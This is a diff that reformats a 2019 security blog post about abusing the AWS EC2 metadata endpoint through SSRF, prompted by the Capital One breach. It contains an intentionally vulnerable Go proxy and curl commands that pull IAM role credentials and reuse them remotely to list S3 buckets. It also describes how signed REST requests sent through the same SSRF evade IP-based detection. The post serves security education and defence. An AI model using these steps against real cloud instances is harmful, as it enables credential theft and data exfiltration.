@@ -4,7 +4,10 @@ title: "Metadata abuse in AWS"
 subtitle: Avoiding detection of the use of compromised credentials
 date: 2019-09-03
 categories: [Developer, got ya]
+toc: true
 ---
+
+## Introduction
 
 A few weeks ago there was an attack on Capital One’s AWS infrastructure that lead to the [compromise of personal information](https://www.capitalone.com/facts2019/) on around 100M people.
 
@@ -16,7 +19,7 @@ It used a technique called Server Side Request Forgery (make requests from a com
 
 However, once you start thinking about it, this attack is eye-opening.
 
-### Credentials compromise
+## Credentials compromise
 
 The details published on the [indictment](https://www.justice.gov/usao-wdwa/press-release/file/1188626/download) of the accused individual are a bit generic, but [some researchers have been digging around](https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/) and we have a better picture of what happened.
 
@@ -24,7 +27,7 @@ It seems that the attacker managed to trick an incorrectly configured module in 
 
 It seems those credentials allowed to access a few S3 buckets. Using those credentials, the attacker connected to AWS S3 API endpoints directly and downloaded the information from those buckets without any further use of the firewall instance.
 
-#### Metadata endpoints
+### Metadata endpoints
 
 There are obvious issues in how Capital One configured its infrastructure.
 
@@ -40,7 +43,7 @@ From the metadata endpoint the instance can have access to some configuration va
 
 aws $ curl http://169.254.169.254/latest/meta-data/local-ipv410.70.120.226Having the configuration as something external to the instance, allows to bootstrap the instance using a single “template” (virtual machine image) together with some configuration.
 
-#### Metadata endpoints and credentials
+### Metadata endpoints and credentials
 
 The metadata endpoint also may contain the credentials associated with the instance.
 
@@ -60,7 +63,7 @@ To avoid that, when preparing the instance to launch, the user can create a defi
 
 To access the metadata endpoint, the instance doesn’t need credentials. But in theory, the metadata endpoint can only be accessed from the actual instance. So it should be safe. 😈
 
-#### Credentials compromise using SSRF
+### Credentials compromise using SSRF
 
 As I just mentioned, the metadata endpoint is in a link-local address, which means it can only be accessed from the actual instance.
 
@@ -78,68 +81,92 @@ It’s so easy that, once you understand the attack, you start checking all the 
 
 Anyway, since I wanted to investigate the behaviour, I created a very crappy proxy in Golang. **Please, don’t use it in production** (or for anything important for that matter).
 
+```go
 package main
 // Crappy proxy. DON'T USE IT IN PRODUCTION, PLEASE, PLEASE PLEASE
 import (
-"log"
-"net/http"
-"net/http/httputil"
-"net/url"
-)func indexHandler(w http.ResponseWriter, r *http.Request) {
-urlQueryParam := r.URL.Query().Get("url")
-origin, \_ := url.Parse(urlQueryParam) director := func(req *http.Request) {
-req.Host = origin.Host //See <https://git.io/fjNmS>
-req.URL = origin
+  "log"
+  "net/http"
+  "net/http/httputil"
+  "net/url"
+)
+
+func indexHandler(w http.ResponseWriter, r *http.Request) {
+  urlQueryParam := r.URL.Query().Get("url")
+  origin, \_ := url.Parse(urlQueryParam)
+  director := func(req *http.Request) {
+    req.Host = origin.Host //See <https://git.io/fjNmS>
+    req.URL = origin
+  }
+  proxy := &httputil.ReverseProxy{Director: director}
+  proxy.ServeHTTP(w, r)
 }
-proxy := &httputil.ReverseProxy{Director: director}
-proxy.ServeHTTP(w, r)
-}func main() {
-http.HandleFunc("/", indexHandler)
-log.Fatal(http.ListenAndServe(":80", nil))
-}Once I developed the code, I launched an Amazon Instance (_t2.nano_ will do), with the default AWS Linux Image, and associated a security group with ports 22 and 80 open (but only for my IP). I created an IAM role (assigning “s3 readonly” permissions, enough for a test) and assigned the role to the instance.
+
+func main() {
+  http.HandleFunc("/", indexHandler)
+  log.Fatal(http.ListenAndServe(":80", nil))
+}
+```
+
+Once I developed the code, I launched an Amazon Instance (_t2.nano_ will do), with the default AWS Linux Image, and associated a security group with ports 22 and 80 open (but only for my IP). I created an IAM role (assigning “s3 readonly” permissions, enough for a test) and assigned the role to the instance.
 
 Once the instance was up and running, I followed the usual steps to connect the instance…
 
+```bash
 local $ eval `ssh-agent -s`
 local $ ssh-add ~/key_i_just_created_with_the_instance.pem
-local $ ssh ec2-user@<public ip of the instance>… followed by the typical steps for installing golang …
+local $ ssh ec2-user@<public ip of the instance>…
+```
 
+followed by the typical steps for installing golang …
+
+```bash
 aws $ sudo yum update
 aws $ sudo yum install -y golangand then I launched the forwarding proxy:
 
 aws $ go build ./forward.go
 aws $ sudo ./forward
+```
 
-> I had a crappy proxy listening on port 80, ready to forward any request that it receives in the _url_ parameter.The proxy is purposely dumb (it’s a simple example of SSRF). But being so simple, it’s obvious that it also forwards any requests to the metadata endpoint.
+I had a crappy proxy listening on port 80, ready to forward any request that it receives in the _url_ parameter.The proxy is purposely dumb (it’s a simple example of SSRF). But being so simple, it’s obvious that it also forwards any requests to the metadata endpoint.
 
 And for all intents and purposes, the request seems to be made from the actual instance. So I can get the credentials under which the EC2 instance is running:
 
-local $ curl <aws-ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<name of the role>{
-"Code" : "Success",
-"LastUpdated" : "2019-08-18T19:40:03Z",
-"Type" : "AWS-HMAC",
-"AccessKeyId" : "<REDACTED>",
-"SecretAccessKey" : "<REDACTED>",
-"Token" : "<REDACTED>",
-"Expiration" : "2019-08-19T02:10:29Z"
-}I don’t know what was the specific compromise in Capital One’s case.
+```
+local $ curl <aws-ip>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<name of the role>
+{
+  "Code" : "Success",
+  "LastUpdated" : "2019-08-18T19:40:03Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "<REDACTED>",
+  "SecretAccessKey" : "<REDACTED>",
+  "Token" : "<REDACTED>",
+  "Expiration" : "2019-08-19T02:10:29Z"
+}
+```
+
+I don’t know what was the specific compromise in Capital One’s case.
 
 But **SSRF can be really nasty in a cloud environment**.
 
-### Using compromised credentials
+## Using compromised credentials
 
 Obviously, once you have those credentials, you can use them from anywhere in the world.
 
 In the following listing, from a local machine exploiting SSRF, first we get the credentials and then those credentials are used to get the number of S3 buckets.
 
+```bash
 local $ curl -s <aws-machine-ip>/?url=<http://169.254.169.254/latest/meta-data/iam/security-credentials/gonzalo-metadata> > /tmp/aws_cred.json
 local $ export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/aws\_cred.json)
 local $ export AWS\_SECRET\_ACCESS\_KEY=$(jq -r '.SecretAccessKey' /tmp/aws_cred.json)
 local $ export AWS_SESSION_TOKEN=$(jq -r '.Token' /tmp/aws_cred.json)
 local $ aws s3 ls|wc -l
-8Let’s reiterate this again.
+8
+```
 
-> Once you’ve got the credentials, you can use them to access any AWS services that the instance is allowed to access.#### Mitigations
+Let’s reiterate this again.
+
+Once you’ve got the credentials, you can use them to access any AWS services that the instance is allowed to access.#### Mitigations
 
 Last year people in Netflix where already aware of this problem and wrote a couple of super interesting articles on [detection](https://medium.com/netflix-techblog/netflix-cloud-security-detecting-credential-compromise-in-aws-9493d6fd373a) and [prevention](https://medium.com/netflix-techblog/netflix-information-security-preventing-credential-compromise-in-aws-41b112c15179) for this type of attacks.
 
@@ -148,24 +175,33 @@ You should read both articles, because they explain the problem and solutions be
 - For **detection**, you can parse CloudTrail (AWS CloudTrail is a service that logs every call to AWS). Simplifying, you would check and record the IP from where the instance makes an API call for the first time. If later on, that instance makes another call from a different IP, it is most likely an attacker using the credentials he/she has already obtained.
 - For **prevention**, instances wouldn’t have direct access to the metadata endpoint. They would have access to a proxy that would check if the call has a specific header attached. Attaching a header to the proxy would be more difficult than making a simple request.
 
-### REST API exploiting
+## REST API exploitation
 
 Netflix’s **detection** technique assumes that once the credentials are compromised, the attacker no longer uses the EC2 instance to access AWS services. And with that assumption, detects the compromise in a change of IP address.
 
-![Wolf in sheep’s clothing](/img/1*VQB6XiMQRlENB2a59jeZ2g.jpeg)Wolf in sheep’s clothing (by [Drew Travin](https://www.flickr.com/photos/drewtarvin/24107843813))But that is not a correct assumption. Because [some](https://docs.aws.amazon.com/AmazonS3/latest/API/RESTServiceGET.html) of the AWS services can be accessed via GET using a REST API (and a specific [signing process](https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html)). And if the attacker managed to invoke the metadata endpoint, it may be able to invoke the REST API, especially considering that REST APIs can receive all the parameters via query string.
+![Wolf in sheep’s clothing](/img/1*VQB6XiMQRlENB2a59jeZ2g.jpeg)_Wolf in sheep’s clothing (by [Drew Travin](https://www.flickr.com/photos/drewtarvin/24107843813))_
+
+But that is not a correct assumption. Because [some](https://docs.aws.amazon.com/AmazonS3/latest/API/RESTServiceGET.html) of the AWS services can be accessed via GET using a REST API (and a specific [signing process](https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html)). And if the attacker managed to invoke the metadata endpoint, it may be able to invoke the REST API, especially considering that REST APIs can receive all the parameters via query string.
 
 I’m not going to detail the steps (sorry, no public code), but I can confirm that the following works:
 
 - Use SSRF to get the credentials (as we saw it before).
 - Build the request and sign it. In [this example](https://docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html#sig-v4-examples-get-query-string) you can see how to do it, although it will need some modifications because that script doesn’t manage session tokens. The documentation is not quite correct (*COUGH*payload_hash*COUGH*).
 - Use SSRF again to send the request using the URL for the signed request. In the below example, the invocation uses only a GET request with query string parameters (no need to send headers). The end result is a list of buckets that the instance can access. Using SSRF we have accessed AWS APIs.
+
+```bash
   local $ eval `python3 creds.py`
   <?xml version="1.0" encoding="UTF-8"?>
-  <ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Owner><ID>[REDACTED]</ID><DisplayName>[REDACTED]</DisplayName></Owner><Buckets><Bucket><Name>[REDACTED]</Name><CreationDate>2019-07-09T19:01:03.000Z</CreationDate></Bucket>[...]</Buckets></ListAllMyBucketsResult>I want to stress that since we’re using SSRF, the request comes from the instance.
+  <ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Owner><ID>[REDACTED]</ID><DisplayName>[REDACTED]</DisplayName></Owner><Buckets><Bucket><Name>[REDACTED]</Name><CreationDate>2019-07-09T19:01:03.000Z</CreationDate></Bucket>[...]</Buckets></ListAllMyBucketsResult>
+```
 
-![AWS Cloudtrail record of the API access where the source IP is the instance IP](/img/1*U8CWJ354T_MiGu0eCZKPEg.png)CloudTrail entry for the “attack”. Source IP is the actual instance IPSo, limiting the source IP has no impact.
+I want to stress that since we’re using SSRF, the request comes from the instance.
 
-> Netflix proposal for a detection system may not work.### Conclusions
+![AWS Cloudtrail record of the API access where the source IP is the instance IP](/img/1*U8CWJ354T_MiGu0eCZKPEg.png)_CloudTrail entry for the “attack”. Source IP is the actual instance IPSo, limiting the source IP has no impact._
+
+Netflix proposal for a detection system may not work.
+
+## Conclusions
 
 Netflix’s technique to detect credentials abuse is not always valid. When coupling SSRF with metadata endpoint abuse, it can be avoided by using REST API exploitation.
 
